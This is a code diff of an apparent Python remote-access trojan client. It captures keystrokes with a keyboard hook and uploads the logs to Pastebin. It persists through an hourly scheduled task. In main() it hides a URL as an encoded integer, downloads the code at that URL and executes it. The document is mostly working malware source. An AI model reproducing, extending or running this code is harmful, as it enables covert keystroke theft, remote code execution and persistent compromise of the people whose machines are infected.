@@ -874,41 +874,43 @@ class Client(object):
         return True
         
     def _keylogger_helper(self):
-        try:
-            self.keylogger.options['buffer'] = tempfile.SpooledTemporaryFile(max_size=self.keylogger.options.get('max_size'), suffix='.txt', delete=False)
-            while True:
-                if self.exit or self.keylogger.options['buffer']._rolled:
-                    break
-                else:
-                    time.sleep(5)
-            result = self._upload_pastebin(self.keylogger.options['buffer'].name)
-            self._result.update({time.ctime(): result})
+        while True:
             try:
-                os.remove(self.keylogger.options['buffer'].name)
-            except: pass
-            if self.exit:
-                return
-            return self._keylogger_helper()
-        except Exception as e:
-            self._print("Keylogger helper function error: {}".format(str(e)))
+                self.keylogger.options['buffer'] = tempfile.SpooledTemporaryFile(max_size=self.keylogger.options.get('max_size'), suffix='.txt')
+                while True:
+                    if self.keylogger.options['buffer']._rolled:
+                        break
+                    elif self._exit:
+                        break
+                    elif not self.keylogger.status.is_set():
+                        break
+                    else:
+                        time.sleep(5)
+                result = self._upload_pastebin(self.keylogger.options['buffer'].name)
+                self._result.update({time.ctime(): result})
+                try:
+                    os.remove(self.keylogger.options['buffer'].name)
+                except: pass
+                if self._exit:
+                    break
+                if not self.keylogger.status.is_set():
+                    break
+            except Exception as e:
+                self._print("Keylogger helper function error: {}".format(str(e)))
+                break
                 
     def _keylogger_manager(self):
-        exists = bool()
-        if 'keylogger_helper' not in self._threads:
-            exists = False
-        else:
-            if self._threads['keylogger_helper'].is_alive():
-                exists = True
-            else:
-                exists = False
-        if not exists:
-            self._threads['keylogger_helper'] = threading.Thread(target=self._keylogger_helper, name=time.time())
-            self._threads['keylogger_helper'].start()
+        keylogger_helper = threading.Thread(target=self._keylogger_helper)
+        keylogger_helper.start()
         while True:
             if self._exit:
                 break
             if not self.keylogger.status.is_set():
                 break
+            if not keylogger_helper.is_alive():
+                del keylogger_helper
+                keylogger_helper = threading.Thread(target=self._keylogger_helper)
+                keylogger_helper.start()
             hm = HookManager()
             hm.KeyDown = self._keylogger_event
             hm.HookKeyboard()
@@ -1095,7 +1097,8 @@ class Client(object):
             if not os.path.isfile(task_run):
                 backup = os.popen(' '.join(copy, self._long_to_bytes(long(self.__f__)), task_run)).read()
             try:
-                result = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+                cmd = 'SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run)
+                result = subprocess.check_output(cmd, shell=True)
                 if 'SUCCESS' in result:
                     self._result['persistence']['scheduled_task'] = result
                     return True
@@ -1263,12 +1266,28 @@ class Client(object):
 
 
 def main(*args, **kwargs):
+    kwargs = {
+#            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+#            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
+            "__e__": "423224063517525567299427660991207813087967857812230603629111",
+            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "__v__": "12620",
+	    "__w__": "12095051301478169748777225282050429328988589300942044190524178883912990436509786",
+            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
+    }
     if '__w__' in kwargs:
         exec 'import urllib' in globals()
         imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(kwargs['__w__'])).strip('0x').strip('L')))).read()
         exec imports in globals()
     if '__f__' not in kwargs and '__file__' in globals():
-        kwargs['__f__'] = globals()['__file__']
+        kwargs['__f__'] = bytes(long(globals()['__file__'].encode('hex'), 16))
     return Client(**kwargs)
 
 if __name__ == '__main__':
